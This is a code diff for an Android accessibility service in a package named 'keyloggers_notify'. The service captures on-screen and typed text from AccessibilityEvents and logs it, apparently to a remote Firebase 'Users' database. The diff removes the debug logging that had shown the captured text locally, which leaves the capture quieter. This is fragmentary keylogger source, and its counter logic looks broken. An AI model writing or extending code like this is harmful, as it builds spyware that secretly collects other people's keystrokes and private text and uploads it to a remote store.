@@ -6,9 +6,7 @@ package com.example.halac.keyloggers_notify;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
-import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
-import android.widget.Toast;
 
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
@@ -25,7 +23,6 @@ public class MyAccessibilityService extends AccessibilityService {
 
     @Override
     public void onServiceConnected() {
-        Log.d("test", "Connected");
         Users user = db.getUser ();
         database = FirebaseDatabase.getInstance().getReference("Users");
         id =database.push().getKey();
@@ -67,8 +64,7 @@ public class MyAccessibilityService extends AccessibilityService {
                 counter++;
                 data = event.getText().toString();
                 if(counter != 0) s = data;
-                else {addLog("TEXT",data,time);
-                    Log.d("test", data);};
+                else {addLog("TEXT",data,time);}
                 break;
             case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                 if(counter != 0) {
